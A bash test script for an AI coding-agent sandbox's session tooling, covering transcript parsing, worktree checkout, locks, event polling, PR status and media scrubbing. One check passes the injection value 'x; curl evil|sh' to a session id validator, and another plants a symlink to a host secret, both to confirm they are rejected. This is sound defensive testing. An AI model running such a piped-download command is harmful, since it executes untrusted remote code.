#!/usr/bin/env bash
# Offline check for session records and transcript parsing.
#   bash lib/session.check.sh
set -u
fail=0
check() { # check <name> <want> <got>
  if [ "$2" = "$3" ]; then printf 'ok   %s\n' "$1"
  else printf 'FAIL %s: want [%s] got [%s]\n' "$1" "$2" "$3"; fail=1; fi
}
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
FXA_SESSION_DIR="$tmp" source "$(dirname "$0")/session.sh"

echo '{"key":"agent-7f3a","state":"starting"}' > "$tmp/agent-7f3a.json"
session_set agent-7f3a state active slot fxa-auto-3
check "set writes fields" "active fxa-auto-3" "$(session_get agent-7f3a state) $(session_get agent-7f3a slot)"
check "live while active" "yes" "$(session_live agent-7f3a && echo yes)"
session_set agent-7f3a state stopped
check "not live once stopped" "no" "$(session_live agent-7f3a || echo no)"
check "unknown key is not live" "no" "$(session_live agent-0000 || echo no)"

ev="$(printf '%s\n' \
  '{"type":"system","subtype":"init","session_id":"abc"}' \
  '{"type":"assistant","message":{"content":[{"type":"text","text":"working"}]}}' \
  '{"type":"result","result":"Plan.\nOPTION: keep A\nOPTION: drop A\nstatus: needs-input"}' \
  '{"type":"result","result":"Done.\nstatus: ready"}' \
  '{"type":"result","result":"no marker"}' | _session_parse | jq -s -c '.')"
check "init carries the session id" "abc" "$(jq -r '.[0].session_id' <<< "$ev")"
check "assistant chatter is dropped" "4" "$(jq length <<< "$ev")"
check "options become a question" "question keep A,drop A" "$(jq -r '.[1] | "\(.type) \(.options | join(","))"' <<< "$ev")"
check "marker lines leave the text" "Plan." "$(jq -r '.[1].text' <<< "$ev")"
check "ready marker" "ready Done." "$(jq -r '.[2] | "\(.status) \(.text)"' <<< "$ev")"
check "missing marker means needs-input" "needs-input" "$(jq -r '.[3].status' <<< "$ev")"

# Codex: its reply and turn end are separate events, joined by _session_fold.
cx="$(printf '%s\n' 'Reading additional input from stdin...' \
  '{"type":"thread.started","thread_id":"cx-1"}' \
  '{"type":"item.started","item":{"type":"command_execution","command":"/bin/bash -lc \u0027ls packages\u0027"}}' \
  '{"type":"item.completed","item":{"type":"agent_message","text":"Done.\nstatus: ready"}}' \
  '{"type":"turn.completed","usage":{}}' | _session_parse | jq -s -c . | _session_fold "")"
check "codex init carries the thread id" "cx-1" "$(jq -r '.events[0].session_id' <<< "$cx")"
check "codex turn end joins the last message" "ready Done." "$(jq -r '.events[1] | "\(.status) \(.text)"' <<< "$cx")"
split1="$(printf '%s\n' '{"type":"item.completed","item":{"type":"agent_message","text":"Pick one\nOPTION: A\nOPTION: B"}}' | _session_parse | jq -s -c . | _session_fold "")"
split2="$(printf '%s\n' '{"type":"turn.completed"}' | _session_parse | jq -s -c . | _session_fold "$(jq -r .last <<< "$split1")")"
check "codex message and turn end in different polls" "question A,B" "$(jq -r '.events[0] | "\(.type) \(.options | join(","))"' <<< "$split2")"
check "codex command becomes a step" "Running ls packages" "$(printf '%s\n' '{"type":"item.started","item":{"type":"command_execution","command":"/bin/bash -lc \u0027ls packages\u0027"}}' | _session_activity)"

# session_checkout: throwaway worktree on the session branch, runner tree pulled in.
eval "$(sed -n '/^worktree_filtered_status() {/,/^}/p;/^worktree_branch_for() {/,/^}/p' "$(dirname "$0")/worktree.sh")"
_worktree_pull_if_remote() { :; }
worktree_git_ok() { :; }
g() { git -c init.defaultBranch=main -c core.hooksPath=/dev/null "$@"; }
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.com GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.com
g init -q "$tmp/fxa"; printf '**/node_modules\nai\n' > "$tmp/fxa/.gitignore"; printf 'a\n' > "$tmp/fxa/a.txt"
mkdir "$tmp/fxa/node_modules"
g -C "$tmp/fxa" add . && g -C "$tmp/fxa" commit -qm base
worktree_repo_root() { printf '%s\n' "$tmp/fxa"; }
# The runner's tree: one edit, one new file, orchestration files.
mkdir -p "$tmp/runner"; printf 'a\nedit\n' > "$tmp/runner/a.txt"; printf 'new\n' > "$tmp/runner/b.txt"
printf '{}' > "$tmp/runner/.fxa-auto-done.json"
vm_pull_tree() { rsync -a --exclude .git --exclude node_modules "$tmp/runner/" "$3/"; }
echo "{\"key\":\"agent-t1\",\"state\":\"active\",\"base_sha\":\"$(g -C "$tmp/fxa" rev-parse HEAD)\"}" > "$tmp/agent-t1.json"
session_checkout agent-t1 "$tmp/wt" 2>/dev/null
check "checkout is on the session branch" "agent-t1" "$(g -C "$tmp/wt" branch --show-current)"
check "only the runner's work shows" "M a.txt|?? b.txt" "$(worktree_filtered_status "$tmp/wt" | sed 's/^ //' | tr '\n' '|' | sed 's/|$//')"
check "node_modules is linked, not copied" "yes" "$([ -L "$tmp/wt/node_modules" ] && echo yes)"
check "main checkout untouched" "" "$(g -C "$tmp/fxa" status --porcelain)"
session_checkout_remove "$tmp/wt"
check "checkout removed" "gone 1" "$([ -e "$tmp/wt" ] || echo gone) $(g -C "$tmp/fxa" worktree list | grep -c .)"

# session_stop saves the runner's work as a patch before deleting the runner.
vm_is_running() { return 0; }
vm_exec_as_agent() { printf 'diff --git a/a.txt b/a.txt\n'; }
agent_stop() { echo stopped > "$tmp/agent_stop"; }
session_stop agent-t1 2>/dev/null
check "stop saves a patch" "diff --git a/a.txt b/a.txt" "$(cat "$tmp/agent-t1.patch")"
check "stop deletes the runner" "stopped" "$(cat "$tmp/agent_stop" 2>/dev/null)"
check "record says stopped" "stopped" "$(session_get agent-t1 state)"

# Lock: one holder; a stale lock is taken over.
_session_lock agent-t1 && check "first lock wins" "yes" yes
check "second lock loses" "no" "$(_session_lock agent-t1 && echo yes || echo no)"
touch -t 202001010000 "$tmp/agent-t1.lock"
check "stale lock is taken over" "yes" "$(_session_lock agent-t1 && echo yes)"
_session_unlock agent-t1

# cmd_events against a stubbed runner.
eval "$(sed -n '/^cmd_events() {/,/^}/p;/^cmd_diff() {/,/^}/p;/^_session_key() {/,/^}/p' "$(dirname "$0")/../fxa-sandbox-ctl")"
_session_key() { :; }
RUNNER=""; RUNNING=1; TURNS_FILE="$tmp/turns"
vm_exec_as_agent() { printf '%s' "$RUNNER"; }
_session_turn_running() { [ "$RUNNING" = 1 ]; }
_session_turn() { echo t >> "$TURNS_FILE"; session_set "$1" turn_open 1 turn_started "$(date +%s)"; }
reset() { echo "{\"key\":\"agent-t2\",\"state\":\"active\",\"turn_open\":\"1\",\"turn_started\":\"$1\"}" > "$tmp/agent-t2.json"; rm -f "$tmp/agent-t2.queue" "$TURNS_FILE"; }

reset 0; RUNNER='{"type":"system","subtype":"init","session_id":"s1-abcdefgh"}
'; RUNNING=0
out="$(cmd_events agent-t2 --since 0)"
check "dead turn with no result is an error" "error" "$(jq -r '.events[0].type' <<< "$out")"
check "dead turn closes the turn" "0" "$(session_get agent-t2 turn_open)"
check "session id captured" "s1-abcdefgh" "$(session_get agent-t2 claude_session_id)"

reset "$(date +%s)"; RUNNING=0
check "fresh turn gets a grace period" "0" "$(cmd_events agent-t2 --since 0 | jq '.events | length')"

reset 0; RUNNING=1
check "live turn with no result is quiet" "0" "$(cmd_events agent-t2 --since 0 | jq '.events | length')"

reset 0; RUNNING=0; printf 'next\n' > "$tmp/agent-t2.queue"
RUNNER='{"type":"result","result":"done\nstatus: ready"}
{"type":"result","res'
out="$(cmd_events agent-t2 --since 4)"
check "cursor skips the half-written line" "5" "$(jq .cursor <<< "$out")"
check "turn end closes the turn, then the queue drains" "1 1" "$(grep -c . "$TURNS_FILE") $(session_get agent-t2 turn_open)"
check "queue file consumed" "gone" "$([ -e "$tmp/agent-t2.queue" ] || echo gone)"

reset 0; session_set agent-t2 state wrapping; RUNNING=1
RUNNER='{"type":"result","result":"wrapped\nstatus: ready"}
'
check "wrap-up reply is not shown" "0" "$(cmd_events agent-t2 --since 0 | jq '.events | length')"

session_set agent-t2 state pr_open pr_url https://example.com/pull/1
check "pr announced once" "pr 0" "$(cmd_events agent-t2 | jq -r '.events[0].type') $(cmd_events agent-t2 | jq '.events | length')"
_session_repo_url() { echo https://github.com/example/repo; }
session_set agent-t2 pushed_branch agent-t2 pushed_announced 0
check "push announced once, with a compare link" "pushed compare/main...agent-t2 0" "$(cmd_events agent-t2 | jq -r '.events[0] | "\(.type) \(.url | capture("(?<c>compare/.*)\\?").c)"') $(cmd_events agent-t2 | jq '.events | length')"

# Diff on a paused session reads the saved patch; there is no runner to ask.
echo '{"key":"agent-t4","state":"paused"}' > "$tmp/agent-t4.json"; printf 'diff --git a/x b/x\n' > "$tmp/agent-t4.patch"
_session_sh() { echo "ssh called"; return 1; }
check "diff on a paused session prints the saved patch" "diff --git a/x b/x" "$(cmd_diff agent-t4)"

# A snapshot row for a session with no media folder is still one JSON object.
eval "$(sed -n '/^_snapshot_session_row() {/,/^}/p' "$(dirname "$0")/snapshot.sh")"
echo '{"key":"agent-t5","state":"stopped","last_activity":'"$(date +%s)"'}' > "$tmp/agent-t5.json"
check "snapshot row without media is valid" "agent-t5 0" "$(_snapshot_session_row "$tmp/agent-t5.json" "$(date +%s)" | jq -r '"\(.key) \(.media | length)"')"
mkdir -p "$tmp/agent-t5.media"; touch "$tmp/agent-t5.media/shot.png" "$tmp/agent-t5.media/notes.html"
check "snapshot row lists only servable media, with a time" "shot.png true" "$(_snapshot_session_row "$tmp/agent-t5.json" "$(date +%s)" | jq -r '.media | map("\(.name) \(.at > 0)") | join(",")')"

# Media from the sandbox is untrusted: only plain, safely named files survive.
m="$tmp/scrub"; mkdir -p "$m/sub"; echo secret > "$tmp/host-secret"
printf 'png' > "$m/ok.png"; ln -s "$tmp/host-secret" "$m/link.mp4"; ln "$m/ok.png" "$m/hard.png" 2>/dev/null
printf 'x' > "$m/$(printf 'a\n.env\nb.png')"; printf 'x' > "$m/notes.html"; printf 'x' > "$m/sub/deep.png"
dd if=/dev/zero of="$m/big.webm" bs=1048576 count=51 2>/dev/null
_session_media_scrub "$m"
check "media scrub keeps only plain safe files" "" "$(cd "$m" && ls -A | tr '\n' ' ')"
check "media scrub never touches the link target" "secret" "$(cat "$tmp/host-secret")"
printf 'png' > "$m/ok.png"; _session_media_scrub "$m"
check "media scrub keeps a good file" "ok.png" "$(cd "$m" && ls -A)"
check "a malformed session id is refused" "no yes" "$(_session_valid_sid 'x; curl evil|sh' && echo yes || echo no) $(_session_valid_sid 01a0e2b2-cace-7fd1-834b-ffc1003e19c6 && echo yes || echo no)"

# History: the request, then each reply once, even when the bot re-reads a cursor.
echo '{"key":"agent-t3","state":"active","turn_open":"1","turn_started":"0"}' > "$tmp/agent-t3.json"
printf 'fix it\n\nEarlier messages in this Slack thread: x' > "$tmp/agent-t3.prompt.md"
RUNNING=0; RUNNER='{"type":"result","result":"done it\nstatus: ready"}
'
cmd_events agent-t3 --since 0 >/dev/null; cmd_events agent-t3 --since 0 >/dev/null
check "history holds the request and one reply" "user:fix it|agent:done it" "$(session_history agent-t3 | jq -r 'map("\(.role):\(.text)") | join("|")')"
session_set agent-t3 owner_name "Test User" owner_image "https://avatars.slack-edge.com/x_48.png"
_session_history_add agent-t3 user "second" "Other User" ""
check "history carries who sent each message" "Test User:https://avatars.slack-edge.com/x_48.png|Other User:" "$(session_history agent-t3 | jq -r 'map(select(.role == "user")) | map("\(.name // ""):\(.image // "")") | join("|")')"
session_set agent-t2 state active turn_open 0 last_error "Open PR failed: x"; RUNNER=''
check "last error reported once" "Open PR failed: x|0" "$(cmd_events agent-t2 | jq -r '.events[0].text')|$(cmd_events agent-t2 | jq '.events | length')"
runtime_skill_ref() { printf '/%s' "$1"; }
check "push wrap-up skips the review" "0|1" "$(_session_wrapup_prompt agent-x --no-pr | grep -c fxa-review-quick)|$(_session_wrapup_prompt agent-x --no-pr | grep -c fxa-auto-done.json.tmp)"
check "PR wrap-up keeps the review" "1" "$(_session_wrapup_prompt agent-x | grep -c fxa-review-quick)"
# A dead turn says why: stderr lands in the transcript as a plain line.
reset 0; RUNNER='{"type":"system","subtype":"init","session_id":"s1-abcdefgh"}
OAuth token has expired. Please run /login
'; RUNNING=0
check "dead turn names its last output" "1" "$(cmd_events agent-t2 --since 0 | jq -r '.events[0].text' | grep -c 'OAuth token has expired')"

# Handoff notes and the host step come from the finish log.
printf 'Squashing 1 commit(s)\n  WARN: could not upload a.png to the media bucket: x\n  WARN: could not upload b.png to the media bucket: x\nCreating pull request via gh...\n' > "$SESSION_DIR/agent-t2.finish.log"
check "notes count failed uploads" "2 screenshot(s) did not upload, so the PR is missing them." "$(_session_finish_notes agent-t2)"
check "wrap step after the turn" "Opening the pull request" "$(_session_wrap_step agent-t2)"
: > "$SESSION_DIR/agent-t2.finish.log"
check "wrap step before any host line" "Staging the work on the host" "$(_session_wrap_step agent-t2)"
session_set agent-t2 state pr_open pr_url https://github.com/mozilla/fxa/pull/1 pr_announced 0 finish_notes "one
two" summary '{"cost":1.5,"turns":3,"minutes":20,"diff":"2 files changed"}'
out="$(cmd_events agent-t2)"
check "pr event carries notes and summary" "2|1.5" "$(jq -r '.events[0] | "\(.notes | length)|\(.summary.cost)"' <<< "$out")"
check "notes are announced once" "" "$(session_get agent-t2 finish_notes)"

# The summary is built from the runner's transcript and diff.
_session_sh() { case "$2" in *jsonl*) printf '' ;; *shortstat*) printf ' 3 files changed, 10 insertions(+)\n' ;; esac; }
_snapshot_agent_json() { echo '{"cost_so_far":2.25}'; }
session_set agent-t2 turns 4 created "$(( $(date +%s) - 600 ))"
_session_record_summary agent-t2
check "summary fields" "2.25|4|10|3 files changed, 10 insertions(+)" "$(session_get agent-t2 summary | jq -r '"\(.cost)|\(.turns)|\(.minutes)|\(.diff)"')"

# The thread follows its PR: CI, reviews and state from gh.
gh() { printf '%s' '{"state":"OPEN","reviewDecision":"CHANGES_REQUESTED","latestReviews":[{"author":{"login":"rev1"},"state":"CHANGES_REQUESTED"}],"statusCheckRollup":[{"name":"extract","status":"COMPLETED","conclusion":"FAILURE"},{"name":"unit","status":"COMPLETED","conclusion":"SUCCESS"},{"context":"ci/circleci","state":"SUCCESS"}]}'; }
session_set agent-t2 pr_url https://github.com/mozilla/fxa/pull/1
out="$(session_pr_status agent-t2)"
check "pr status: ci, failing, infra, review" "fail|extract|extract|rev1:CHANGES_REQUESTED" "$(jq -r '"\(.ci)|\(.failing | join(","))|\(.infra | join(","))|\(.reviews | map("\(.login):\(.state)") | join(","))"' <<< "$out")"
gh() { printf '%s' '{"state":"OPEN","statusCheckRollup":[{"name":"unit","status":"IN_PROGRESS","conclusion":null},{"context":"ci/circleci","state":"PENDING"}]}'; }
check "pr status: running" "running" "$(session_pr_status agent-t2 | jq -r .ci)"
unset -f gh

exit "$fail"
